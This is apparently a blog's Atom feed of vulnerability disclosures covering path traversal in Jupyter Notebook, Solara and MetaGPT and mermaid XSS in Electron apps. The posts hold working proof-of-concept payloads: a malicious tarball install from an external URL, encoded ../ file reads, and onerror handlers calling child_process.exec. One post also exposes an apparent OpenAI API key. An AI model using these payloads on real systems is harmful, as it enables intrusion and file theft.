<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-08-13T15:06:28+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Overwrite in jupyter notebook</title><link href="http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite in jupyter notebook" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Arbitrary File Overwrite in jupyter notebook</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>6.5.7</p>
</blockquote>

<h3 id="summary">Summary</h3>

<p>Notebook can install a Javascript extension <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L69">from remote sources</a>, if the remote source package is compressed using tar format, it will use <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L154"><code class="language-plaintext highlighter-rouge">tarfile.extractall</code></a> to extract tarball.  However, it doesn’t filter the members in tarball, in this case, members with absolute and relative path names will be extract outside target directory, causing arbitrary file overwrite.</p>

<h3 id="details">Details</h3>

<p>From the <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L635">source code</a>, user can install nbextension by following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jupyter nbextension install path|url [--user|--sys-prefix]
</code></pre></div></div>
<p>When installing packages from an url, it calls <code class="language-plaintext highlighter-rouge">install_nbextension</code> to download the tarball from online source and extracts the tarball using <code class="language-plaintext highlighter-rouge">tarfile.extractall</code>.
The vulnerable function <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L154"><code class="language-plaintext highlighter-rouge">install_nbextension#L154</code></a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def install_nbextension(path, overwrite=False, symlink=False,
                        user=False, prefix=None, nbextensions_dir=None,
                        destination=None, verbose=DEPRECATED_ARGUMENT,
                        logger=None, sys_prefix=False
                        ):
    ...
    if path.startswith(('https://', 'http://')):
        if symlink:
            raise ValueError("Cannot symlink from URLs")
        # Given a URL, download it
        with TemporaryDirectory() as td:
            filename = urlparse(path).path.split('/')[-1]
            local_path = os.path.join(td, filename)
            if logger:
                logger.info(f"Downloading: {path} -&gt; {local_path}")
            urlretrieve(path, local_path)
            # now install from the local copy
            full_dest = install_nbextension(local_path, overwrite=overwrite, symlink=symlink,
                nbextensions_dir=nbext, destination=destination, logger=logger)
    elif path.endswith('.zip') or _safe_is_tarfile(path):
        if symlink:
            raise ValueError("Cannot symlink from archives")
        if destination:
            raise ValueError("Cannot give destination for archives")
        if logger:
            logger.info(f"Extracting: {path} -&gt; {nbext}")

        if path.endswith('.zip'):
            archive = zipfile.ZipFile(path)
        elif _safe_is_tarfile(path):
            archive = tarfile.open(path)
        # Vulnerable sink!!!!
        archive.extractall(nbext)
        archive.close()
        ...

    return full_dest
</code></pre></div></div>

<h3 id="poc">PoC</h3>

<ol>
  <li>
    <p>Using following command to install a malicious extension:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  jupyter nbextension install https://media.githubusercontent.com/media/sunriseXu/onnx/main/hack.tar.gz --user
</code></pre></div>    </div>
  </li>
  <li>Check file path <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> has been overwritten
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ls -la /home/kali/.ssh
  &gt; -rw-r--r--  1 kali kali 2098 Sep 11  2023 authorized_keys
</code></pre></div>    </div>
  </li>
  <li>Check on <a href="https://colab.research.google.com/drive/1iX1yj4CaRn4fQBoiejQM059Xp9z8gOmm?usp=sharing">colab</a>.</li>
</ol>

<p><img width="751" alt="1720496729240" src="https://github.com/jupyter/notebook/assets/33363160/90fc632b-dd9c-43c2-9a41-61ded73ac4a8" /></p>

<h3 id="impact">Impact</h3>

<p>If a victim installs a malicious tarball extension, the tarball will be extracted outside the target directory and cause arbitrary file overwrite.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">CVE-2024-39903: Local File Inclusion in Solara</title><link href="http://localhost:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html" rel="alternate" type="text/html" title="CVE-2024-39903: Local File Inclusion in Solara" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>CVE-2024-39903: Local File Inclusion in Solara</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>1.34.1</p>
</blockquote>

<h3 id="summary">Summary</h3>

<p>A local file inclusion is present in the Solara when requesting resource files under the <code class="language-plaintext highlighter-rouge">/{cdn_helper.cdn_url_path}/&lt;path:path&gt;</code> route.</p>

<h3 id="details">Details</h3>

<p>The endpoint <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/flask.py#L215">cdn</a> is used to load resource file from cdn. However when resource file is cached, it will load files from local file system directly.</p>

<p>The <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/flask.py#L215"><code class="language-plaintext highlighter-rouge">cdn</code> endpoint</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@blueprint.route(f"/{cdn_helper.cdn_url_path}/&lt;path:path&gt;")
def cdn(path):
    if not allowed():
        abort(401)
    cache_directory = settings.assets.proxy_cache_dir
    content = cdn_helper.get_data(Path(cache_directory), path)
    mime = mimetypes.guess_type(path)
    return flask.Response(content, mimetype=mime[0])
</code></pre></div></div>

<p>The <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L38"><code class="language-plaintext highlighter-rouge">get_data</code></a> calls <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L24"><code class="language-plaintext highlighter-rouge">get_from_cache</code></a> to lookup cached files, it  concatenates <code class="language-plaintext highlighter-rouge">path</code> into <code class="language-plaintext highlighter-rouge">base_cache_dir</code> to get cached path directly and load the content afterwards. The <code class="language-plaintext highlighter-rouge">path</code> comes from the <code class="language-plaintext highlighter-rouge">&lt;path:path&gt;</code> part of <code class="language-plaintext highlighter-rouge">cdn</code> route. In this case, when path is <code class="language-plaintext highlighter-rouge">..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code>, attacks can use path traversal to read any files in local file system.</p>

<p>The function <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L38"><code class="language-plaintext highlighter-rouge">get_data</code></a> and <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L24"><code class="language-plaintext highlighter-rouge">get_from_cache</code></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_data(base_cache_dir: pathlib.Path, path):
    parts = path.replace("\\", "/").split("/")
    store_path = path if len(parts) != 1 else pathlib.Path(path) / "__main.js"

    content = get_from_cache(base_cache_dir, store_path)
    if content:
        return content

    url = get_cdn_url(path)
    response = requests.get(url)
    if response.ok:
        put_in_cache(base_cache_dir, store_path, response.content)
        return response.content
    else:
        logger.warning("Could not load URL: %r", url)
        raise Exception(f"Could not load URL: {url}")

def get_from_cache(base_cache_dir: pathlib.Path, path):
    cache_path = base_cache_dir / path
    try:
        logger.info("Opening cache file: %s", cache_path)
        return cache_path.read_bytes()
    except FileNotFoundError:
        pass
</code></pre></div></div>

<h3 id="poc">PoC</h3>

<ol>
  <li>
    <p>Install Solara:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> pip install solara
</code></pre></div>    </div>
  </li>
  <li>Create <code class="language-plaintext highlighter-rouge">sol.py</code> following <a href="https://github.com/widgetti/solara/tree/master?tab=readme-ov-file#first-script">official docs</a>:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  import solara

 # Declare reactive variables at the top level. Components using these variables
 # will be re-executed when their values change.
 sentence = solara.reactive("Solara makes our team more productive.")
 word_limit = solara.reactive(10)


 @solara.component
 def Page():
     # Calculate word_count within the component to ensure re-execution when reactive variables change.
     word_count = len(sentence.value.split())

     solara.SliderInt("Word limit", value=word_limit, min=2, max=20)
     solara.InputText(label="Your sentence", value=sentence, continuous_update=True)

     # Display messages based on the current word count and word limit.
     if word_count &gt;= int(word_limit.value):
         solara.Error(f"With {word_count} words, you passed the word limit of {word_limit.value}.")
     elif word_count &gt;= int(0.8 * word_limit.value):
         solara.Warning(f"With {word_count} words, you are close to the word limit of {word_limit.value}.")
     else:
         solara.Success("Great short writing!")


 # The following line is required only when running the code in a Jupyter notebook:
 Page()
</code></pre></div>    </div>
  </li>
  <li>
    <p>Start the solara server.</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> solara run sol.py
 &gt; Solara server is starting at http://localhost:8765
</code></pre></div>    </div>
  </li>
  <li>
    <p>Open the url: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8765/_solara/cdn/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code>, the output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 ...
</code></pre></div>    </div>

    <p><img src="/assets/cve/solara.png" alt="poc" /></p>
  </li>
</ol>

<h3 id="impact">Impact</h3>

<p>Any file on the backend filesystem can be read by an attacker with access to the solara server directly(If reverse proxy server such as nginx is used, the path parameter will be blocked).</p>

<h2 id="reference">Reference</h2>

<p><a href="https://github.com/widgetti/solara/security/advisories/GHSA-9794-pc4r-438w">https://github.com/widgetti/solara/security/advisories/GHSA-9794-pc4r-438w</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt</title><link href="http://localhost:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html" rel="alternate" type="text/html" title="Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/06/24/zipslip-in-metagpt</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Zipslip when parsing invoice zip file via InvoiceOCRAssistant</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-23: Relative Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>0.8.1</p>
</blockquote>

<h2 id="description">Description</h2>

<p>In <a href="https://docs.deepwisdom.ai/main/en/guide/use_cases/agent/receipt_assistant.html"><code class="language-plaintext highlighter-rouge">receipt_assistant</code></a>, Metagpt supports OCR recognition of invoice files in pdf, png, jpg, and zip formats. And the class <a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L31C7-L31C17"><code class="language-plaintext highlighter-rouge">InvoiceOCR</code></a> is responsible for recognizing the invoice files. When the files is compressed with zip format, <a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L63"><code class="language-plaintext highlighter-rouge">InvoiceOCR._unzip</code></a> is used to extract the files in zip file. However, the file name in zip file is not sanitized and appended to dest path directly, could cause zipslip attacks. It’s possible to overwrite files in victims’ mechine, causing code execution attacks.</p>

<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L78">InvoiceOCR._unzip#L78</a> function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
async def _unzip(file_path: Path) -&gt; Path:
    """Unzip a file and return the path to the unzipped directory.

    Args:
        file_path: The path to the zip file.

    Returns:
        The path to the unzipped directory.
    """
    file_directory = file_path.parent / "unzip_invoices" / datetime.now().strftime("%Y%m%d%H%M%S")
    with zipfile.ZipFile(file_path, "r") as zip_ref:
        for zip_info in zip_ref.infolist():
            # Use CP437 to encode the file name, and then use GBK decoding to prevent Chinese garbled code
            relative_name = Path(zip_info.filename.encode("cp437").decode("gbk"))
            if relative_name.suffix:
                # unsafe path appending
                full_filename = file_directory / relative_name
                await File.write(full_filename.parent, relative_name.name, zip_ref.read(zip_info.filename))

    logger.info(f"unzip_path: {file_directory}")
    return file_directory
</code></pre></div></div>

<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39"><code class="language-plaintext highlighter-rouge">File.write#L39</code></a> function is reponsible for writing the file content in zip file to target path. In Line 39, <code class="language-plaintext highlighter-rouge">full_path = root_path / filename</code>, the <code class="language-plaintext highlighter-rouge">filename</code> is not santized, filename such as <code class="language-plaintext highlighter-rouge">../../../../../../../../test.txt</code> in zip file will be appended to <code class="language-plaintext highlighter-rouge">root_path</code>, causing path traversal and file overwrite.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def write(cls, root_path: Path, filename: str, content: bytes) -&gt; Path:
    """Write the file content to the local specified path.

    Args:
        root_path: The root path of file, such as "/data".
        filename: The name of file, such as "test.txt".
        content: The binary content of file.

    Returns:
        The full filename of file, such as "/data/test.txt".

    Raises:
        Exception: If an unexpected error occurs during the file writing process.
    """
    root_path.mkdir(parents=True, exist_ok=True)
    full_path = root_path / filename
    async with aiofiles.open(full_path, mode="wb") as writer:
        await writer.write(content)
        logger.debug(f"Successfully write file: {full_path}")
        return full_path
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>Firstly, let’s create a zip file containing relative file name, and save as <code class="language-plaintext highlighter-rouge">auth.zip</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip auth.zip ../../../../../../../home/kali/test.py
</code></pre></div></div>

<p>Then, install metagpt and it’s ocr extras:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install --upgrade metagpt
pip install --upgrade 'metagpt[ocr]'
</code></pre></div></div>

<p>After installed, we need to init metagpt with our openai key according to <a href="https://github.com/geekan/MetaGPT?tab=readme-ov-file#configuration">official documentation</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># create 
&gt; metagpt --init-config

# fill your openai key, this key is for testing
&gt; sed -i 's/YOUR_API_KEY/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/g' /root/.metagpt/config2.yaml
</code></pre></div></div>

<p>Before attacks, let’s check the <code class="language-plaintext highlighter-rouge">/home/kali/test.py</code> is empty path</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /home/kali/test.py
ls: cannot access '/home/kali/test.py': No such file or directory
</code></pre></div></div>

<h3 id="start-attack">Start attack</h3>

<p>Run following snippets from <a href="https://docs.deepwisdom.ai/main/en/guide/use_cases/agent/receipt_assistant.html#example-1">offical tutorial</a> to parse and recognize our <code class="language-plaintext highlighter-rouge">auth.zip</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from metagpt.roles.invoice_ocr_assistant import InvoiceOCRAssistant, InvoicePath
from metagpt.schema import Message

role = InvoiceOCRAssistant()
await role.run(Message(content="Invoicing date", instruct_content=InvoicePath(file_path="auth.zip")))
</code></pre></div></div>

<p>Now let’s check the file is overwritten successfully:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /home/kali/test.py
-rw-r--r-- 1 root root 12 Jun 24 14:50 /home/kali/test.py
</code></pre></div></div>

<h2 id="colab">Colab</h2>

<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1ujE5yqxcB_RlRtXMfNSSeTYPLy6DMDwQ?usp=sharing">https://colab.research.google.com/drive/1ujE5yqxcB_RlRtXMfNSSeTYPLy6DMDwQ?usp=sharing</a></p>

<p><img src="https://live.staticflickr.com/65535/53811891297_68e84388c8_h.jpg" alt="poc" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. If victims parse and recognize an malicious zip file, zipslip can be achieved to overwrite files in victims mechine, causing potential code execution attack.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L79">_unzip#L79</a></p>

<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39">write#L39</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)</title><link href="http://localhost:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram</id><content type="html" xml:base="http://localhost:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.</p>

<h3 id="details">Details</h3>
<p>Bluestone is using <a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67">mermaid 10.0.2</a> to render mermaid diagram. <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">This issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. Specifically, The names of node are not fully sanitized which leads to  injection of XSS payload.</p>

<p>Besides, the electron app sets <code class="language-plaintext highlighter-rouge">nodeIntegration</code> to <a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33"><code class="language-plaintext highlighter-rouge">true</code></a> which is harmful, according to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction">this attack</a>, a XSS can be escalated to execute command on victims’ local system.</p>

<h3 id="poc">PoC</h3>

<ol>
  <li>
    <p>Download latest Bluestone v0.22.0 windows electron app from <a href="https://github.com/1943time/bluestone/releases/download/v0.22.0/Bluestone-win-x64.exe">official repo</a>, and install the application:</p>
  </li>
  <li>
    <p>Open the payload markdown file using the Bluestone app, the payload is following:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
 Class01 &lt;|-- `AveryLngClas&lt;img src='x' onerror=require('child_process').exec('calc');&gt;`
</code></pre></div>    </div>
  </li>
  <li>
    <p>The calculator poped up.</p>

    <p><img src="/assets/images/mermaid/bluestone-rce.png" alt="rce" /></p>
  </li>
</ol>

<h3 id="impact">Impact</h3>

<p>Client side code execution.</p>

<h3 id="reference">Reference</h3>

<p><a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986</a></p>

<h3 id="occurence">Occurence</h3>

<p><a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67">https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67</a></p>

<p><a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33">https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33</a></p>

<h3 id="mitigation">Mitigation</h3>

<ol>
  <li>Upgrade the mermaid to latest version which is <code class="language-plaintext highlighter-rouge">10.9.1</code>.</li>
  <li>Disable <code class="language-plaintext highlighter-rouge">nodeIntegration</code> in electron app.</li>
</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.]]></summary></entry><entry><title type="html">XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE(Just Thanks)</title><link href="http://localhost:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram</id><content type="html" xml:base="http://localhost:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.</p>

<h3 id="details">Details</h3>
<p>Siyuan is using <a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">mermaid 10.8.0</a> to render mermaid diagram. However, <a href="https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98">the test html</a> in mermaid repo showed that the edge label names of <a href="https://github.com/mermaid-js/mermaid/pull/5221">new block diagram</a> is not sanitized and could lead to XSS. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>

<p>Besides, the electron app sets <code class="language-plaintext highlighter-rouge">nodeIntegration</code> to <a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305"><code class="language-plaintext highlighter-rouge">true</code></a> which is harmful, according to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction">this attack</a>, a XSS can be escalated to execute command on victims’ local system.</p>

<h3 id="poc">PoC</h3>

<ol>
  <li>
    <p>Download latest Siyuan-3.0.17 windows electron app from <a href="https://release.liuyun.io/siyuan/siyuan-3.0.17-win.exe">official site</a>, and install the application:</p>
  </li>
  <li>Create new document, and type <code class="language-plaintext highlighter-rouge">/Mermaid</code> command to insert mermaid diagram using following payload:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  block-beta
  `A-- "X&lt;img src=x onerror=require('child_process').exec('calc');&gt;" --&gt;B
</code></pre></div>    </div>
  </li>
  <li>
    <p>The calculator poped up.</p>

    <p><img src="/assets/images/mermaid/siyuan-rce.png" alt="rce" /></p>
  </li>
</ol>

<h3 id="impact">Impact</h3>

<p>Client side code execution.</p>

<h3 id="reference">Reference</h3>

<p><a href="https://github.com/siyuan-note/siyuan/issues/11645">https://github.com/siyuan-note/siyuan/issues/11645</a></p>

<p><a href="https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98">https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98</a></p>

<h3 id="occurence">Occurence</h3>

<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305</a></p>

<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.]]></summary></entry><entry><title type="html">XSS in Outline when rendering mermaid diagrams(No Security Impact!)</title><link href="http://localhost:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Outline when rendering mermaid diagrams(No Security Impact!)" /><published>2024-06-02T10:31:06+08:00</published><updated>2024-06-02T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram</id><content type="html" xml:base="http://localhost:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.</p>

<h3 id="details">Details</h3>
<p>Outline is using <a href="https://github.com/outline/outline/blob/cb0f03d69820d9cd3422252cb511c7dfeed61904/package.json#L151">mermaid 9.3.0</a> to render mermaid diagram. However, <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">this issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>

<h3 id="poc">PoC</h3>

<ol>
  <li>Use <code class="language-plaintext highlighter-rouge">/Mermaid Diagram</code> to insert following xss payload:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  classDiagram
  Class01 &lt;|-- `AveryLongClass&lt;img src='x' onerror=alert(document.domain)&gt;`
  Class03 *-- Class04
  Class05 o-- Class06
  Class07 .. Class08
  Class01 : size()
  Class01 : int chimp
  Class01 : int gorilla
</code></pre></div></div>
<ol>
  <li>
    <p>Open chrome devtools, you can see CSP is blocking the XSS from executing.</p>

    <p><img width="762" alt="outline-xss" src="https://github.com/outline/outline/assets/33363160/360801a9-0964-46f2-9244-5b2d4466da72" />
 <img width="647" alt="outline-xss2" src="https://github.com/outline/outline/assets/33363160/519f4340-187a-401f-a2be-356b8d6e1513" /></p>
  </li>
  <li>
    <p>Use following paylod to inject forms for phishing:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
 Class01 &lt;|-- `&lt;form action='https://google.com'&gt;&lt;label for='fname'&gt;First name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='fname' name='fname' value='John'&gt;&lt;br&gt;&lt;label for='lname'&gt;Last name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='lname' name='lname' value='Doe'&gt;&lt;br&gt;&lt;br&gt;&lt;input type='submit' value='Submit'&gt;&lt;/form&gt;`
</code></pre></div>    </div>

    <p><img width="672" alt="xss-phishing" src="https://github.com/outline/outline/assets/33363160/4e495246-59bf-44b3-a41d-eb9459cb2a69" /></p>
  </li>
  <li>
    <p>Use following to inject css styles:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
